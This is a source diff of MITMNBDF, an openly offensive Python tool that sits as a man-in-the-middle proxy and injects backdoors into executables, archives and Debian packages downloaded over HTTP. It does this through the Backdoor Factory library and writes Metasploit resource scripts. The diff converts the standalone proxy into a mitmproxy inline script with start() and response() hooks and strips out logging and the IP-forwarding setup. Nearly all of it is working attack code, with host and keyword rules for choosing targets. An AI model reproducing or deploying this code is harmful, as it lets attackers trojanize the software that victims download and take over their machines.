@@ -1,50 +1,19 @@
-#!/usr/bin/env python
-"""
-    MITMNBDF v1.0
-    Author Davide Barbato
-    Copyright (c) 2015, Davide Barbato
-    All rights reserved.
-    Redistribution and use in source and binary forms, with or without modification,
-    are permitted provided that the following conditions are met:
-        1. Redistributions of source code must retain the above copyright notice,
-        this list of conditions and the following disclaimer.
-        2. Redistributions in binary form must reproduce the above copyright notice,
-        this list of conditions and the following disclaimer in the documentation
-        and/or other materials provided with the distribution.
-        3. Neither the name of the copyright holder nor the names of its contributors
-        may be used to endorse or promote products derived from this software without
-        specific prior written permission.
-    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
-    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
-    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
-    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
-    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
-    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
-    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
-    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
-    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
-    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
-    POSSIBILITY OF SUCH DAMAGE.
-
-    Tested on Ubuntu 14.04
-"""
-
-from libmproxy import controller, proxy, platform
-from libmproxy.proxy.server import ProxyServer
-import os
 from bdf import pebin
 from bdf import elfbin
 from bdf import machobin
-import shutil
-import sys
-import pefile
-import logging
-import tempfile
+import os
 import libarchive
 import magic
-from contextlib import contextmanager
+import tempfile
+import pefile
+import shutil
+import sys
+import StringIO
 from configobj import ConfigObj
-from multiprocessing import Process, Queue
+from contextlib import contextmanager
+from libmproxy.script import concurrent
+
+CONFIGFILE = None
 
 
 @contextmanager
@@ -57,47 +26,14 @@ def in_dir(dirpath):
         os.chdir(prev)
 
 
-class EnhancedOutput:
-    def __init__(self):
-        pass
-
-    @staticmethod
-    def print_error(txt):
-        print "[x] {}".format(txt)
-
-    @staticmethod
-    def print_info(txt):
-        print "[*] {}".format(txt)
-
-    @staticmethod
-    def print_warning(txt):
-        print "[!] {}".format(txt)
-
-    @staticmethod
-    def logging_error(txt):
-        logging.error("ERRO|{}".format(txt))
-
-    @staticmethod
-    def logging_warning(txt):
-        logging.warning("WARN|{}".format(txt))
-
-    @staticmethod
-    def logging_info(txt):
-        logging.info("INFO|{}".format(txt))
-
-    @staticmethod
-    def logging_debug(txt):
-        logging.debug("DEBG|{}".format(txt))
-
-    @staticmethod
-    def logging_critical(txt):
-        logging.debug("CRIT|{}".format(txt))
-
-    @staticmethod
-    def print_size(f):
-        # assuming f in bytes
-        size = len(f) / 1024
-        EnhancedOutput.print_info("File size: {} KB".format(size))
+@contextmanager
+def stdout_redirect(where):
+    old_stdout = sys.stdout
+    sys.stdout = where
+    try:
+        yield
+    finally:
+        sys.stdout = old_stdout
 
 
 # handles the archive types.
@@ -148,19 +84,18 @@ class MITMnBDFInjector:
     oplist = ['LinuxIntelx86', 'LinuxIntelx64', 'WindowsIntelx86', 'WindowsIntelx64', 'MachoIntelx86', 'MachoIntelx64']
 
     flow = None
+    context = None
 
-    def __init__(self, flow):
+    def __init__(self, flow, context):
         self.flow = flow
+        self.context = context
 
         try:
             self.set_config()
             # do the injection here!
             self.handle()
         except Exception as exc:
-            EnhancedOutput.print_error(exc)
-            EnhancedOutput.logging_debug("Config file failed: {}".format(exc))
-
-        resp_q.put(self.flow)
+            raise Exception(exc)
 
     def set_config(self):
         self.userConfig = ConfigObj(CONFIGFILE)
@@ -170,8 +105,10 @@ class MITMnBDFInjector:
         self.keys_whitelist = self.userConfig['keywords']['whitelist']
         self.archive_types = self.userConfig['Overall']['supportedArchiveTypes']
         self.binary_types = self.userConfig['Overall']['supportedBinaryTypes']
+
         # let's configure the backdoor params for each type of binary
         self.update_binaries('ALL')
+
         # write the msf resource file
         self.write_resource_script(self.userConfig['Overall']['resourceScriptFile'])
 
@@ -216,16 +153,9 @@ class MITMnBDFInjector:
         try:
             archive_type = ArchiveType(arch_info['type'])
         except Exception as ex:
-            EnhancedOutput.print_error("Missing fields in the config file: {}".format(ex))
-            EnhancedOutput.print_warning("Returning original file.")
-            EnhancedOutput.logging_error("Error setting archive type: {}. Returning original file.".format(ex))
             return arch_file_bytes
 
-        EnhancedOutput.print_size(arch_file_bytes)
-
         if len(arch_file_bytes) > archive_type.maxSize:
-            EnhancedOutput.print_error("{} over allowed size".format(arch_info['type']))
-            EnhancedOutput.logging_info("{} maxSize met {}".format(arch_info['type'], len(arch_file_bytes)))
             return arch_file_bytes
 
         tmp_dir = tempfile.mkdtemp()
@@ -235,23 +165,16 @@ class MITMnBDFInjector:
                 flags = libarchive.extract.EXTRACT_OWNER | libarchive.extract.EXTRACT_PERM | libarchive.extract.EXTRACT_TIME
                 libarchive.extract_memory(arch_file_bytes, flags)
         except Exception as exce:
-            EnhancedOutput.print_error("Can't extract file. Returning original one.")
-            EnhancedOutput.logging_error("Can't extract file: {}. Returning original one.".format(exce))
             return arch_file_bytes
-
-        EnhancedOutput.print_info("{} file contents and info".format(arch_info['type']))
-        EnhancedOutput.print_info("Compression: {}".format(arch_info['filter']))
 
         files_list = list()
         for dirname, dirnames, filenames in os.walk(tmp_dir):
             dirz = dirname.replace(tmp_dir, ".")
-            print "\t{0}".format(dirz)
             if include_dirs:
                 files_list.append(dirz)
             for f in filenames:
                 fn = os.path.join(dirz, f)
                 files_list.append(fn)
-                print "\t{} {}".format(fn, os.lstat(os.path.join(dirname, f)).st_size)
 
         patch_count = 0
         patched = False
@@ -261,16 +184,12 @@ class MITMnBDFInjector:
             with libarchive.file_writer(tmp_archive.name, arch_info['format'], arch_info['filter']) as archive:
                 for filename in files_list:
                     full_path = os.path.join(tmp_dir, filename)
-                    EnhancedOutput.print_info(">>> Next file in archive: {}".format(filename))
-
                     if os.path.islink(full_path) or not os.path.isfile(full_path):
-                        EnhancedOutput.print_warning("{} is not a file, skipping.".format(filename))
                         with in_dir(tmp_dir):
                             archive.add_files(filename)
                         continue
 
                     if os.lstat(full_path).st_size >= long(self.file_size_max):
-                        EnhancedOutput.print_warning("{} is too big, skipping.".format(filename))
                         with in_dir(tmp_dir):
                             archive.add_files(filename)
                         continue
@@ -288,48 +207,40 @@ class MITMnBDFInjector:
                                 continue
 
                     if keyword_check is True:
-                        EnhancedOutput.print_warning("Archive blacklist enforced!")
-                        EnhancedOutput.logging_info("Archive blacklist enforced on {}".format(filename))
                         continue
 
                     if patch_count >= archive_type.patchCount:
                         with in_dir(tmp_dir):
                             archive.add_files(filename)
-                        EnhancedOutput.logging_info("Met archive config patch count limit. Adding original file.")
                     else:
                         # create the file on disk temporarily for binaryGrinder to run on it
                         tmp = tempfile.NamedTemporaryFile()
                         shutil.copyfile(full_path, tmp.name)
                         tmp.flush()
-                        patch_result = self.binary_injector(tmp.name)
+
+                        with stdout_redirect(StringIO.StringIO()) as new_stdout:
+                            patch_result = self.binary_injector(tmp.name)
                         if patch_result:
                             patch_count += 1
                             file2 = os.path.join(self.staging_folder, os.path.basename(tmp.name))
-                            EnhancedOutput.print_info("Patching complete, adding to archive file.")
                             # let's move the backdoored file to the final location
                             shutil.copyfile(file2, full_path)
-                            EnhancedOutput.logging_info(
-                                "{} in archive patched, adding to final archive".format(filename))
                             os.remove(file2)
                             patched = True
+                            self.context.log("Patching {}: done".format(filename))
                         else:
-                            EnhancedOutput.print_error("Patching failed")
-                            EnhancedOutput.logging_error("{} patching failed. Keeping original file.".format(filename))
+                            self.context.log("Patching {}: failed".format(filename), level="error")
 
                         with in_dir(tmp_dir):
                             archive.add_files(filename)
                         tmp.close()
 
         except Exception as exc:
-            EnhancedOutput.print_error(
-                "Error while creating the archive: {}. Returning the original file.".format(exc))
-            EnhancedOutput.logging_error("Error while creating the archive: {}. Returning original file.".format(exc))
             shutil.rmtree(tmp_dir, ignore_errors=True)
             tmp_archive.close()
             return arch_file_bytes
 
         if patched is False:
-            EnhancedOutput.print_info("No files were patched. Forwarding original file")
             shutil.rmtree(tmp_dir, ignore_errors=True)
             tmp_archive.close()
             return arch_file_bytes
@@ -341,25 +252,15 @@ class MITMnBDFInjector:
         shutil.rmtree(tmp_dir, ignore_errors=True)
         tmp_archive.close()
 
-        EnhancedOutput.logging_info(
-            "Patching complete for HOST: {} ({}), PATH: {}".format(self.flow.request.host, self.host_domain,
-                                                                   self.flow.request.path))
         return ret
 
     def deb_files(self, deb_file):
         try:
             archive_type = ArchiveType('AR')
         except Exception as e:
-            EnhancedOutput.print_error("Missing fields in the config file: {}".format(e))
-            EnhancedOutput.print_warning("Returning original file")
-            EnhancedOutput.logging_error("Error setting archive type: {}. Returning original file.".format(e))
             return deb_file
 
-        EnhancedOutput.print_size(deb_file)
-
         if len(deb_file) > archive_type.maxSize:
-            EnhancedOutput.print_error("AR File over allowed size")
-            EnhancedOutput.logging_info("AR File maxSize met {}".format(len(deb_file)))
             return deb_file
 
         tmp_dir = tempfile.mkdtemp()
@@ -381,7 +282,6 @@ class MITMnBDFInjector:
             file2inject = 'data.tar.xz'
             infoz = {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}
 
-        EnhancedOutput.print_info("Patching {0}".format(file2inject))
         # recreate the injected archive
         with open(os.path.join(tmp_dir, file2inject), 'r+b') as f:
             bfz = f.read()
@@ -532,8 +432,6 @@ class MITMnBDFInjector:
             return result
 
         except Exception as e:
-            EnhancedOutput.print_error('binary_injector: {}'.format(e))
-            EnhancedOutput.logging_warning("Exception in binary_injector: {}".format(e))
             return None
 
     def hosts_whitelist_check(self, flow):
@@ -545,17 +443,12 @@ class MITMnBDFInjector:
             elif self.host_whitelist.lower() in flow.request.host.lower() or self.host_whitelist.lower() in str(
                     self.host_domain):
                 self.patchIT = True
-                EnhancedOutput.logging_info(
-                    "Host whitelist hit: {}, HOST: {} ({})".format(self.host_whitelist, flow.request.host,
-                                                                   self.host_domain))
+
         # if hosts are comma separated, then we have a list
         else:
             for keyword in self.host_whitelist:
                 if keyword.lower() in flow.request.host.lower():
                     self.patchIT = True
-                    EnhancedOutput.logging_info(
-                        "Host whitelist hit: {}, HOST: {} ({})".format(self.host_whitelist, flow.request.host,
-                                                                       self.host_domain))
                     break
 
     def keys_whitelist_check(self, flow):
@@ -568,28 +461,20 @@ class MITMnBDFInjector:
                 self.patchIT = True
             elif self.keys_whitelist.lower() in flow.request.path.lower():
                 self.patchIT = True
-                EnhancedOutput.logging_info(
-                    "Keyword whitelist hit: {}, PATH: {}".format(self.keys_whitelist, flow.request.path))
         else:
             for keyword in self.keys_whitelist:
                 if keyword.lower() in flow.requeset.path.lower():
                     self.patchIT = True
-                    EnhancedOutput.logging_info(
-                        "Keyword whitelist hit: {}, PATH: {}".format(keyword, flow.request.path))
                     break
 
     def keys_backlist_check(self, flow):
         if type(self.keys_blacklist) is str:
             if self.keys_blacklist.lower() in flow.request.path.lower():
                 self.patchIT = False
-                EnhancedOutput.logging_info(
-                    "Keyword blacklist hit: {}, PATH: {}".format(self.keys_blacklist, flow.request.path))
         else:
             for keyword in self.keys_blacklist:
                 if keyword.lower() in flow.request.path.lower():
                     self.patchIT = False
-                    EnhancedOutput.logging_info(
-                        "Keyword blacklist hit: {}, PATH: {}".format(keyword, flow.request.path))
                     break
 
     def hosts_blacklist_check(self, flow):
@@ -597,15 +482,10 @@ class MITMnBDFInjector:
             if self.host_blacklist.lower() in flow.request.host.lower() or self.host_blacklist.lower() in str(
                     self.host_domain):
                 self.patchIT = False
-                EnhancedOutput.logging_info(
-                    "Host Blacklist hit: {} : HOST: {} ({}) ".format(self.host_blacklist, flow.request.host,
-                                                                     self.host_domain))
         else:
             for host in self.host_blacklist:
                 if host.lower() in flow.request.host.lower():
                     self.patchIT = False
-                    EnhancedOutput.logging_info(
-                        "Host Blacklist hit: {} : HOST: {} ({})".format(host, flow.request.host, self.host_domain))
                     break
 
     def parse_target(self, target):
@@ -625,8 +505,6 @@ class MITMnBDFInjector:
     def handle(self):
         self.host_domain = self.flow.request.headers['Host'][
             0].lower() if 'Host' in self.flow.request.headers else self.flow.request.host
-
-        # Below are gates from whitelist --> blacklist
         # Blacklists have the final say, but everything starts off as not patchable
         # until a rule says True. Host whitelist overrides keyword whitelist.
 
@@ -636,13 +514,7 @@ class MITMnBDFInjector:
         self.keys_backlist_check(self.flow)
         self.hosts_blacklist_check(self.flow)
 
-        if self.patchIT is False:
-            EnhancedOutput.print_warning("Not patching, flow did not make it through config settings")
-            EnhancedOutput.logging_info(
-                "Config did not allow the patching of HOST: {} ({}), PATH: {}".format(self.flow.request.host,
-                                                                                      self.host_domain,
-                                                                                      self.flow.request.path))
-        else:
+        if self.patchIT is True:
             for target in self.userConfig['targets'].keys():
                 if target == 'ALL':
                     # we don't need to call update_binaries() since it's already called in set_config() at startup
@@ -654,11 +526,7 @@ class MITMnBDFInjector:
                     self.write_resource_script(target.replace('.', '_') + "_msf.rc")
 
             if len(self.flow.reply.obj.response.content) >= long(self.file_size_max):
-                EnhancedOutput.print_warning("Not patching over content-length, forwarding to user")
-                EnhancedOutput.logging_info(
-                    "Not patching, over FileSizeMax setting {} ({}): {}".format(self.flow.request.host,
-                                                                                self.host_domain,
-                                                                                self.flow.request.path))
+                self.context.log("Content too big, not patching", level="error")
                 return
 
             mime_type = magic.from_buffer(self.flow.reply.obj.response.content, mime=True)
@@ -669,23 +537,18 @@ class MITMnBDFInjector:
                 tmp.flush()
                 tmp.seek(0)
 
-                patch_result = self.binary_injector(tmp.name)
-                if patch_result:
-                    EnhancedOutput.print_info("Patching complete, forwarding to user.")
-                    EnhancedOutput.logging_info(
-                        "Patching complete for HOST: {} ({}), PATH: {}".format(self.flow.request.host, self.host_domain,
-                                                                               self.flow.request.path))
+                with stdout_redirect(StringIO.StringIO()) as new_stdout:
+                    patch_result = self.binary_injector(tmp.name)
 
+                if patch_result:
+                    self.context.log("Patching {}: done".format(self.flow.request.path))
                     bd_file = os.path.join(self.staging_folder, os.path.basename(tmp.name))
                     with open(bd_file, 'r+b') as file2:
                         self.flow = file2.read()
 
                     os.remove(bd_file)
                 else:
-                    EnhancedOutput.print_error("Patching failed")
-                    EnhancedOutput.logging_info(
-                        "Patching failed for HOST: {} ({}), PATH: {}".format(self.flow.request.host, self.host_domain,
-                                                                             self.flow.request.path))
+                    self.context.log("Patching {}: failed".format(self.flow.request.path), level="error")
 
                 tmp.close()
             else:
@@ -700,86 +563,21 @@ class MITMnBDFInjector:
                             self.flow = self.archive_files(self.flow.reply.obj.response.content, params)
 
 
-class MITMnBDF(controller.Master):
-    def __init__(self, srv):
-        controller.Master.__init__(self, srv)
+def start(context, argv):
+    if len(argv) < 2:
+        raise Exception("You need to specify a config file")
 
-    def run(self):
-        try:
-            return controller.Master.run(self)
-        except KeyboardInterrupt:
-            self.shutdown()
+    global CONFIGFILE
+    CONFIGFILE = argv[1]
 
-    def handle_request(self, flow):
-        # I know, duplicate - can't think of a better way to do that, sorry
-        host = flow.request.headers['Host'][0].lower() if 'Host' in flow.request.headers else None
+    # Ensure file and folder exist
+    if not os.path.exists(CONFIGFILE) or not os.path.isfile(CONFIGFILE):
+        raise Exception("Config file \'{}\' not found.".format(CONFIGFILE))
 
-        print "*" * 10, "REQUEST", "*" * 10
-        EnhancedOutput.print_info("HOST: {} ({})".format(flow.request.host, host))
-        EnhancedOutput.print_info("PATH: {}".format(flow.request.path))
-        flow.reply()
-        print "*" * 10, "END REQUEST", "*" * 10
 
-    def handle_response(self, flow):
-        host = flow.request.headers['Host'][0].lower() if 'Host' in flow.request.headers else None
-        print "=" * 10, "RESPONSE", "=" * 10
-        EnhancedOutput.print_info("HOST: {} ({})".format(flow.request.host, host))
-        EnhancedOutput.print_info("PATH: {}".format(flow.request.path))
-
-        # MITMnBDFInjector will put in the queue the resulting flow (modified or not)
-        t = Process(target=MITMnBDFInjector, args=(flow,))
-        t.start()
-
-        flow.reply.obj.response.content = resp_q.get()
-        flow.reply()
-        print "=" * 10, "END RESPONSE", "=" * 10
-
-# MAIN #
-CONFIGFILE = "mitmnbdf.cfg"
-resp_q = Queue()
-
-# Ensure file and folder exist
-if not os.path.exists(CONFIGFILE) or not os.path.isfile(CONFIGFILE):
-    EnhancedOutput.print_error("Config file \'{}\' not found.".format(CONFIGFILE))
-    sys.exit(1)
-
-# Initial config file reading
-user_cfg = ConfigObj(CONFIGFILE)
-config = proxy.ProxyConfig(clientcerts=os.path.expanduser(user_cfg['Overall']['certLocation']),
-                           body_size_limit=user_cfg['Overall'].as_int('MaxSizeFileRequested'),
-                           port=user_cfg['Overall'].as_int('proxyPort'),
-                           mode=user_cfg['Overall']['proxyMode'],
-                           )
-
-if user_cfg['Overall']['proxyMode'] != "None":
-    config.proxy_mode = {'sslports': user_cfg['Overall']['sslports'],
-                         'resolver': platform.resolver()
-                         }
-
-server = ProxyServer(config)
-
-numericLogLevel = getattr(logging, user_cfg['Overall']['loglevel'].upper(), None)
-if numericLogLevel is None:
-    EnhancedOutput.print_error("INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
-    sys.exit(1)
-
-logging.basicConfig(filename=user_cfg['Overall']['logname'],
-                    level=numericLogLevel,
-                    format='%(asctime)s|%(message)s'
-                    )
-
-EnhancedOutput.print_warning("Configuring network forwarding.")
-try:
-    if sys.platform == "darwin":
-        os.system("sysctl -w net.inet.ip.forwarding=1")
-    elif sys.platform.startswith("linux"):
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-except Exception as e:
-    EnhancedOutput.print_error(e)
-    sys.exit(1)
-
-m = MITMnBDF(server)
-
-EnhancedOutput.print_info("Starting MITMNBDF")
-EnhancedOutput.logging_info("Starting MITMNBDF")
-m.run()
+@concurrent
+def response(context, flow):
+    # ensure we received a valid request
+    if flow.response.code == 200:
+        mitmnbdf = MITMnBDFInjector(flow, context)
+        flow.response.content = mitmnbdf.flow
